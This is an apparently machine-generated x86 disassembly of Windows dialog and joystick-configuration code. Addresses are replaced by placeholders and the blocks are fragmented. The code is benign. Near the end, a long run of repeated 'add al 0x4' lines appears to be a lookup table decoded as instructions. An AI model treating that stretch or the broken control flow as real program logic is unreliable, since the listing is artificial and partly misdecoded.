mov [ esp + 0x5c ] eax
call edi
mov eax [ esp + 0x1b4 ]
push eax
call sub_4608b0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov ebp [ rw-data ]
mov [ esp + 0x24 ] edi
add ebp 0x8
lea esp [ esp ]
mov edx [ esp + 0x1b4 ]
push 0x0
push 0x77a
push edx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
cmp ebp 0xffffffff
je r-xdata
push 0x0
push esi
push 0x1008
push edi
call ebx
push 0x2
mov ebp esi
dec esi
push esi
push 0x100c
push edi
call ebx
mov esi eax
test esi esi
jge r-xdata
xor edx edx
cmp eax 0x101
sete dl
inc edx
mov eax edx
jmp r-xdata
mov eax [ esp + 0x78 ]
test eax eax
push 0x0
je r-xdata
push 0x0
push 0x0
push 0x468
push 0x784
push ebp
call [ SendDlgItemMessageA@IAT ]
movsx ecx ax
xor esi esi
mov [ esp + 0x1c ] ecx
xor ebp ebp
lea ecx [ ecx ]
mov edx [ ecx + esi * 8 + 0x4 ]
mov eax [ ecx + esi * 8 ]
push edx
push eax
push edi
call ebx
inc esi
jmp r-xdata
cmp esi eax
jge r-xdata
push 0x0
push 0x779
push edi
call ebp
mov esi [ EnableWindow@IAT ]
push eax
call esi
push 0x0
push 0x77a
push edi
call ebp
push eax
call esi
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov ecx edx
mov ebx [ eax + ecx * 4 ]
mov eax ebx
shl eax 0x14
mov [ esp + 0x70 ] ecx
sar eax 0x14
lea ecx [ esp + 0x6c ]
push ecx
lea edx [ eax - 0x1 ]
mov eax [ eax * 4 + rw-data ]
push 0x0
mov [ esp + 0x90 ] edx
mov edx [ esp + 0x24 ]
push 0x1007
push edx
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x9c ] ebx
mov [ esp + 0x90 ] eax
mov [ esp + 0x84 ] 0x0
call esi
mov ecx ebx
lea eax [ esp + 0xac ]
shr ecx 0xc
push eax
and ecx 0xf
push ecx
shr ebx 0x10
push ebx
call sub_45b070
mov ecx [ esp + 0x28 ]
mov eax 0x1
add esp 0xc
mov [ esp + 0x6c ] eax
mov [ esp + 0x74 ] eax
lea eax [ esp + 0x6c ]
push eax
push 0x0
push 0x1006
lea edx [ esp + 0xb8 ]
push ecx
mov [ esp + 0x90 ] edx
call esi
inc [ esp + 0x10 ]
jmp r-xdata
mov edx [ esp + 0x10 ]
cmp edx ecx
jge r-xdata
mov eax [ esp + 0x3c ]
test eax eax
je r-xdata
mov edx eax
push edx
call [ DeleteDC@IAT ]
dec [ esp + 0x1c ]
jne r-xdata
add [ esp + 0x14 ] 0x10
xor ebx ebx
mov ecx [ esp + 0x24 ]
mov eax [ ebp ]
shl eax cl
add ecx 0x2
mov [ esp + 0x24 ] ecx
mov ecx rw-data
shl eax 0x10
or esi eax
inc edi
add ebp 0xc
call sub_45d880
cmp edi eax
jl r-xdata
cmp ebp eax
jl r-xdata
push 0x77a
push esi
call ebx
push eax
call [ EnableWindow@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov eax [ esp + 0x90 ]
shl eax 0x14
sar eax 0x14
dec eax
push eax
push 0x14e
push 0x777
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x1
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
call [ DeleteObject@IAT ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x18 ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x18 ]
push 0xcc0020
push ecx
push ebx
push edx
push 0x10
push 0x10
push 0x0
push 0x0
push eax
call [ BitBlt@IAT ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x24 ]
push 0x0
push eax
push ecx
call [ ImageList_Add@IAT ]
mov eax [ esp + 0x48 ]
add ebx 0x10
lea edx [ ebx + 0x10 ]
cmp edx eax
jle r-xdata
push edi
call [ SetFocus@IAT ]
lea ecx [ esp + 0x6c ]
push ecx
push ebp
mov eax 0x2
push 0x102b
push edi
mov [ esp + 0x8c ] eax
mov [ esp + 0x88 ] eax
call ebx
push 0x0
push ebp
push 0x1013
push edi
call ebx
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
lea ebp [ eax - 0x1 ]
mov ebp [ esp + 0x1b4 ]
mov esi [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
push ecx
inc esi
push esi
lea edx [ ebx + ebp ]
mov ecx [ edx ]
sub esp 0xc
mov eax esp
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ eax + 0x4 ] ecx
push edi
mov [ eax + 0x8 ] edx
call sub_45b110
add esp 0x18
add ebp 0xc
jmp r-xdata
cmp esi edx
jge r-xdata
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
sub_46e5f0
sub esp 0x78
push esi
push edi
mov edi [ esp + 0x84 ]
push 0xfffffffa
push edi
mov [ rw-data ] 0x0
mov [ esp + 0x24 ] 0x30
mov [ esp + 0x28 ] 0x8
call [ GetWindowLongA@IAT ]
mov esi [ CreatePropertySheetPageA@IAT ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x2c ] 0x5dc
mov [ esp + 0x38 ] sub_459f30
mov [ esp + 0x34 ] r--data
call esi
lea ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x2c ] 0x5dd
mov [ esp + 0x38 ] sub_45a0b0
mov [ esp + 0x34 ] r--data
call esi
lea edx [ esp + 0x1c ]
push edx
mov [ esp + 0x10 ] eax
mov [ esp + 0x2c ] 0x5de
mov [ esp + 0x38 ] sub_45a1e0
mov [ esp + 0x34 ] r--data
call esi
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x2c ] 0x5df
mov [ esp + 0x38 ] r-xdata
mov [ esp + 0x34 ] r--data
call esi
lea ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x2c ] 0x5e0
mov [ esp + 0x38 ] sub_46d4c0
mov [ esp + 0x34 ] r--data
call esi
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
lea ecx [ esp + 0x4c ]
lea edx [ esp + 0x8 ]
push ecx
mov [ esp + 0x50 ] 0x34
mov [ esp + 0x54 ] 0x2000180
mov [ esp + 0x74 ] sub_459ee0
mov [ esp + 0x58 ] edi
mov [ esp + 0x64 ] r--data
mov [ esp + 0x68 ] 0x5
mov [ esp + 0x70 ] edx
mov [ esp + 0x6c ] eax
call [ PropertySheetA@IAT ]
pop edi
pop esi
add esp 0x78
retn
sub_46e730
mov al [ esp + 0x4 ]
sub esp 0x1a0
test al al
push ebx
push ebp
push esi
push edi
jne r-xdata
sub esp 0x1a0
mov edi esp
mov ecx 0x68
lea esi [ esp + 0x1b0 ]
[ edi ] [ esi ]
push 0x0
mov ecx rw-data
call sub_46ad10
call [ joyGetNumDevs@IAT ]
mov ebp eax
xor esi esi
test ebp ebp
jle r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov [ rw-data ] 0x1
mov ebx [ joyGetDevCapsA@IAT ]
mov edi [ GetTickCount@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1a0
retn
push 0x194
lea eax [ esp + 0x14 ]
push eax
push esi
call ebx
test eax eax
jne r-xdata
inc esi
cmp esi ebp
jl r-xdata
mov [ esp + 0x1a4 ] eax
call edi
lea ecx [ esp + 0x10 ]
push ecx
mov ecx rw-data
mov [ esp + 0x1ac ] eax
mov [ esp + 0x1b0 ] 0xffffffff
call sub_46ba90
sub_46e7f0
mov eax [ esp + 0x8 ]
sub esp 0x158
push ebx
push ebp
add eax 0xffffffb2
cmp eax 0xc6
push esi
push edi
ja r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x158
retn 0x10
movzx eax [ eax + lookup_table_46f298 ]
jmp [ eax * 4 + jump_table_46f284 ]
push 0x1
call sub_46e730
mov eax [ rw-data ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ esp + 0x174 ]
movzx ecx ax
cmp ecx 0xde9
jg r-xdata
mov esi [ esp + 0x178 ]
push 0x0
push 0x0
push 0x400
push esi
call [ SendMessageA@IAT ]
push esi
mov edi eax
call [ GetDlgCtrlID@IAT ]
cmp eax 0x41e
jne r-xdata
mov ecx [ esp + 0x178 ]
cmp [ ecx + 0x4 ] 0xbbd
jne r-xdata
mov esi [ esp + 0x16c ]
xor edx edx
mov eax 0xdeb
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0x41b
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0x41c
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0xde9
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0xdec
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0x41e
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0x418
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0xdea
mov ecx esi
call sub_457d70
xor edx edx
mov eax 0xbbd
mov ecx esi
call sub_457d70
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x14 ] edx
jne r-xdata
sub ecx 0xdea
je r-xdata
je r-xdata
cmp eax 0x418
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
imul ecx ecx 0xdc
mov [ ecx + edx + 0x10 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
cmp [ ecx + 0x8 ] 0xffffff9b
jne r-xdata
mov ecx rw-data
call sub_45d8d0
push eax
mov ecx rw-data
call sub_46b9c0
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
shr eax 0x10
cmp eax 0x1
jne r-xdata
dec ecx
je r-xdata
shr eax 0x10
cmp eax 0x1
jne r-xdata
cmp ecx 0x41b
jg r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0xdc
mov [ eax + ecx + 0xc ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov eax [ ecx + 0xc ]
test eax eax
jl r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edi [ rw-data ]
mov eax [ esp + 0x16c ]
imul edi edi 0xdc
mov esi [ rw-data ]
push 0xbbd
push eax
add edi esi
call [ GetDlgItem@IAT ]
lea ebp [ edi + 0x1c ]
mov edi [ SendMessageA@IAT ]
mov ebx eax
xor esi esi
shr eax 0x10
cmp eax 0x1
jne r-xdata
dec ecx
jne r-xdata
mov esi [ rw-data ]
mov edx [ esp + 0x178 ]
imul esi esi 0xdc
mov ebx [ rw-data ]
push 0x0
push 0x0
push 0x147
push edx
add esi ebx
call [ SendMessageA@IAT ]
pop edi
mov [ esi + 0x14 ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
cmp ecx 0x41c
jne r-xdata
je r-xdata
test [ ecx + 0x14 ] 0x2
je r-xdata
mov eax [ esp + 0x16c ]
push 0xdeb
push eax
call [ GetDlgItem@IAT ]
mov esi [ SendMessageA@IAT ]
xor ebx ebx
mov [ esp + 0x14 ] eax
xor edi edi
nop
movzx ebp [ edi + esi ]
movzx ecx [ edi + esi + 0x2 ]
mov edi [ rw-data ]
mov ebx [ rw-data ]
shl ebp 0x10
or ebp ecx
xor esi esi
mov [ esp + 0x18 ] edi
jmp r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
inc esi
add ebp 0x4
cmp esi 0x30
jl r-xdata
mov ecx [ esp + 0x178 ]
push 0x0
push 0x0
push 0x147
push ecx
call edi
mov [ ebp ] eax
mov edx [ eax * 4 + rw-data ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x102e
push ebx
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x64 ] edx
call edi
mov ecx [ esp + 0x178 ]
push 0x0
push 0x0
push 0x147
push ecx
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov edi [ esp + 0x16c ]
mov [ rw-data ] eax
imul eax eax 0xdc
add eax ecx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov ecx 0x41b
mov edx edi
call sub_457bf0
mov eax [ ebp + 0x8 ]
mov ecx 0x41c
mov edx edi
call sub_457bf0
mov edx [ ebp + 0x14 ]
mov ebx [ SendDlgItemMessageA@IAT ]
push 0x0
push edx
push 0x14e
push 0xde9
push edi
call ebx
mov eax [ ebp + 0x18 ]
push 0x0
push eax
push 0x14e
push 0xdec
push edi
call ebx
mov ecx [ ebp + 0x10 ]
push ecx
push 0x7
push 0x0
mov esi 0x41e
call sub_457c30
mov edx [ ebp + 0xc ]
push edx
push 0x6
push 0x0
mov esi 0x418
call sub_457c30
add esp 0x18
push 0x0
push 0xffffffff
push 0x14e
push 0xdea
push edi
call ebx
push 0xbbd
push edi
call [ GetDlgItem@IAT ]
xor esi esi
mov [ esp + 0x14 ] eax
add ebp 0x1c
mov edi edi
shr eax 0x10
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
imul edx edx 0xdc
lea ecx [ edx + eax + 0x8 ]
push ecx
mov ecx [ esp + 0x170 ]
mov eax 0x41c
call sub_457ce0
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov edx [ rw-data ]
mov eax [ rw-data ]
imul edx edx 0xdc
lea ecx [ edx + eax + 0x4 ]
push ecx
mov ecx [ esp + 0x170 ]
mov eax 0x41b
call sub_457ce0
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
dec ecx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x37
add edx eax
mov eax [ rw-data ]
mov ecx [ eax + edx * 4 + 0x1c ]
mov edx [ esp + 0x16c ]
push 0x0
push ecx
push 0x14e
push 0xdea
push edx
call [ SendDlgItemMessageA@IAT ]
mov ecx [ rw-data ]
sub ecx ebp
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
push 0x1
push esi
push 0x102c
push ebx
call edi
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
inc esi
add ebp 0x4
cmp esi 0x30
jl r-xdata
mov edx [ ebp ]
push 0x0
push edx
push 0x14e
push 0xdea
push edi
call ebx
mov esi [ rw-data ]
mov eax [ esp + 0x178 ]
imul esi esi 0xdc
mov ebp [ rw-data ]
push 0x0
push 0x0
push 0x147
push eax
add esi ebp
call [ SendMessageA@IAT ]
pop edi
mov [ esi + 0x18 ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
xor eax eax
mov [ esp + 0x18 ] eax
dec ecx
jne r-xdata
mov ebx [ esp + 0x16c ]
push 0xde9
push ebx
call [ GetDlgItem@IAT ]
mov ebp eax
xor edi edi
mov edi edi
mov eax [ esp + 0x14 ]
lea edx [ edi + ebp + 0x4 ]
push edx
push 0x0
push 0x143
push eax
call esi
inc ebx
add edi 0x1a0
jmp r-xdata
cmp ebx edx
jge r-xdata
mov ecx ebx
sub ecx edi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x40 ]
push edx
push esi
push 0x102e
push eax
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x64 ] ecx
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x14 ]
push 0x1
push esi
push 0x102c
push ecx
call [ SendMessageA@IAT ]
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ esp + 0x16c ]
push 0x2
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov ecx [ edi + rw-data ]
push ecx
push 0x0
push 0x143
push ebp
call esi
add edi 0x4
cmp edi 0xc
jb r-xdata
push 0xdec
push ebx
call [ GetDlgItem@IAT ]
mov ebp eax
xor edi edi
lea esp [ esp ]
mov ebp [ rw-data ]
test ebp ebp
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ esp + 0x18 ]
cmp [ ecx ] ebp
je r-xdata
cmp esi edx
jge r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx rw-data
xor edi edi
call sub_45d8a0
test eax eax
mov ebp [ rw-data ]
jle r-xdata
cmp [ esp + 0x18 ] edx
jge r-xdata
mov edx [ edi + rw-data ]
push edx
push 0x0
push 0x143
push ebp
call esi
add edi 0x4
cmp edi 0xc
jb r-xdata
push 0xdea
push ebx
call [ GetDlgItem@IAT ]
mov ebp eax
xor edi edi
lea esp [ esp ]
sub ebx edi
mov eax 0x94f2095
imul ebx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax ecx
inc esi
add eax 0xdc
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esp + 0x16c ]
push 0x1
push ecx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov ecx rw-data
xor esi esi
call sub_45d8a0
test eax eax
jle r-xdata
test ebp ebp
jne r-xdata
mov esi ebp
nop
mov eax [ edi + rw-data ]
push eax
push 0x0
push 0x143
push ebp
call esi
add edi 0x4
cmp edi 0x160
jb r-xdata
mov ecx [ esp + 0x16c ]
push 0xbbd
push ecx
call [ GetDlgItem@IAT ]
xor ebx ebx
push ebx
push ebx
mov edi eax
push 0x1037
push edi
call esi
or eax 0x20
push eax
push ebx
push 0x1036
push edi
call esi
lea edx [ esp + 0x20 ]
push edx
push ebx
push 0x101b
push edi
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] 0x73
mov [ esp + 0x3c ] r--data
mov [ esp + 0x44 ] ebx
call esi
lea eax [ esp + 0x20 ]
push eax
mov ebx 0x1
push ebx
push 0x101b
push edi
mov [ esp + 0x38 ] 0x12c
mov [ esp + 0x3c ] r--data
mov [ esp + 0x44 ] ebx
call esi
mov ebp rw-data
mov ecx [ rw-data ]
imul esi esi 0xdc
mov eax [ esp + 0x14 ]
add esi edi
lea edi [ eax + ecx ]
mov ecx 0x37
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
mov edx [ rw-data ]
mov edi [ esp + 0x1c ]
inc esi
mov [ eax + edx ] ebp
add edi 0x1a0
add eax 0xdc
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] eax
jmp r-xdata
xor esi esi
cmp esi edx
jne r-xdata
mov edi [ rw-data ]
add edi 0x4
mov ecx [ rw-data ]
sub ecx ebp
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edx [ esp + 0x10 ]
cmp eax [ edx + ebx ]
je r-xdata
cmp [ esp + 0x18 ] edi
je r-xdata
mov ecx [ ebp ]
push ecx
lea edx [ esp + 0x6c ]
push edx
call [ lstrcpyA@IAT ]
push r--data
lea ecx [ esp + 0x6c ]
push ecx
call [ lstrcpyA@IAT ]
mov edx [ ebp - 0x60 ]
push edx
lea eax [ esp + 0x6c ]
push eax
call [ lstrcatA@IAT ]
jmp r-xdata
mov esi [ rw-data ]
test esi esi
mov [ esp + 0x1c ] edi
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x14
push 0x1
push eax
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov ecx rw-data
inc esi
add edi 0xdc
call sub_45d8a0
cmp esi eax
jl r-xdata
mov edx [ esp + 0x10 ]
imul edi edi 0xdc
lea esi [ edx + ebx ]
add edi ebp
mov ecx 0x37
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
add ecx ebx
push ecx
mov ecx rw-data
call sub_46ba00
jmp r-xdata
cmp edi edx
jne r-xdata
mov ecx rw-data
inc edi
add esi 0xdc
call sub_45d8a0
cmp edi eax
jl r-xdata
cmp ebp rw-data
jl r-xdata
mov ebp [ rw-data ]
test ebp ebp
mov edi [ rw-data ]
jne r-xdata
push 0x0
push 0x0
push 0x1004
lea eax [ esp + 0x74 ]
push edi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x64 ] eax
call esi
lea ecx [ esp + 0x40 ]
push ecx
push 0x0
push 0x1007
push edi
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] 0x0
call esi
add ebp 0x4
cmp ebp rw-data
jl r-xdata
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esp + 0x16c ]
push 0x1
push ecx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
mov ebx [ rw-data ]
test ebx ebx
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
inc ecx
mov [ esp + 0x18 ] ecx
add eax 0xdc
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov ecx edi
sub ecx ebp
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ebx [ esp + 0x16c ]
push 0xdeb
push ebx
call [ GetDlgItem@IAT ]
mov edx [ rw-data ]
push 0x0
push edx
mov edi eax
push 0x14e
push edi
call esi
push edi
push 0x10deb
push 0x111
push ebx
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x158
retn 0x10
test ebp ebp
jne r-xdata
cmp [ rw-data ] edx
jl r-xdata
sub edi ebp
mov eax 0x4ec4ec4f
imul edi
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov [ rw-data ] 0x0
lea eax [ edx - 0x1 ]
test eax eax
mov [ rw-data ] eax
jge r-xdata
sub_46f29d
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al [ esp + eax ]
add edx [ eax + 0x824448b ]
sub esp 0x108
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov edi [ esp + 0x11c ]
mov ebp [ SendDlgItemMessageA@IAT ]
xor ebx ebx
xor esi esi
lea ecx [ ecx ]
dec eax
je r-xdata
lea eax [ esi + rw-data ]
push eax
lea ecx [ esi + rw-data ]
call sub_46a710
inc ebx
push ebx
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x18 ]
push edx
push 0x0
push 0x143
push 0xbbe
push edi
call ebp
add esi 0x10
cmp esi 0x80
jl r-xdata
mov eax [ rw-data ]
push 0x0
push eax
push 0x14e
push 0xbbe
push edi
call ebp
xor esi esi
lea ecx [ ecx ]
mov ecx [ esp + 0x124 ]
movzx eax cx
cmp eax 0x4ee
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x10
mov ecx [ eax + rw-data ]
sub ecx ebx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
sub eax 0x4ef
je r-xdata
je r-xdata
shl edx 0x4
add edx rw-data
mov ecx [ edx + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ eax + rw-data ]
mov edx [ ecx + esi * 4 ]
mov eax [ edx * 4 + rw-data ]
push eax
push 0x0
push 0x180
push 0xbbf
push edi
call ebp
inc esi
jmp r-xdata
cmp esi ecx
jge r-xdata
mov esi [ esp + 0x11c ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xbbe
push esi
call edi
test eax eax
mov [ esp + 0x10 ] eax
jl r-xdata
sub eax 0x6cf
je r-xdata
mov edi [ esp + 0x11c ]
mov ebp [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xbbe
push edi
call ebp
mov esi eax
test esi esi
jl r-xdata
cmp eax 0x3ee
jg r-xdata
mov esi rw-data
lea ecx [ ecx ]
mov eax [ edx + 0x8 ]
sub eax ecx
sar eax 0x2
test eax eax
jle r-xdata
mov edx [ rw-data ]
mov eax edx
shl eax 0x4
mov ebx [ eax + rw-data ]
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov ebx [ GetDlgItem@IAT ]
push 0x0
push 0x4ee
push esi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0x4ef
push esi
call ebx
push eax
call ebp
push 0x0
push 0x0
push 0x18b
push 0xbbf
push esi
call edi
test eax eax
jle r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
dec eax
jne r-xdata
push 0x0
push 0x0
push 0x188
push 0xbbf
push edi
call ebp
push 0x0
push 0x0
push 0x18b
push 0xbbf
push edi
mov ebx eax
call ebp
cmp ebx 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
cmp eax 0x4ed
jne r-xdata
cmp eax 0x3ed
jge r-xdata
mov ecx [ esi ]
push ecx
push 0x0
push 0x180
push 0xbbd
push edi
call ebp
cmp esi rw-data
jle r-xdata
mov esi [ GetDlgItem@IAT ]
push 0x1
push 0x4ee
push edi
call esi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x1
push 0x4ef
push edi
call esi
push eax
call ebx
push 0x0
push 0x0
push 0x186
push 0xbbf
push edi
call ebp
push 0xbbf
push edi
call esi
push eax
push 0x10bbf
push 0x111
push edi
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x10 ]
shl ecx 0x4
add ecx rw-data
call sub_462cf0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x10
mov ebx eax
mov esi [ esp + 0x11c ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xbbe
push esi
call edi
mov ebp [ GetDlgItem@IAT ]
push 0x0
push 0x4ee
push esi
mov ebx eax
call ebp
push eax
call [ EnableWindow@IAT ]
push 0x0
push 0x4ef
push esi
call ebp
push eax
call [ EnableWindow@IAT ]
push 0x0
push 0x0
push 0x18b
push 0xbbf
push esi
call edi
test eax eax
jle r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
push 0x0
push ebx
push 0x182
push 0xbbf
push edi
call ebp
shl esi 0x4
mov ebp ebx
mov ecx esi
mov esi [ esp + 0x11c ]
mov ebx [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xbbe
push esi
call ebx
test eax eax
mov [ esp + 0x14 ] eax
jl r-xdata
mov esi [ esp + 0x11c ]
mov ebp [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push 0xbbe
push esi
call ebp
mov edi eax
test edi edi
jl r-xdata
dec eax
je r-xdata
cmp esi rw-data
jl r-xdata
push 0x0
push 0x0
push 0x186
push 0xbbd
push edi
call ebp
add esi 0x4
cmp esi rw-data
jl r-xdata
push 0x0
push 0x0
push 0x182
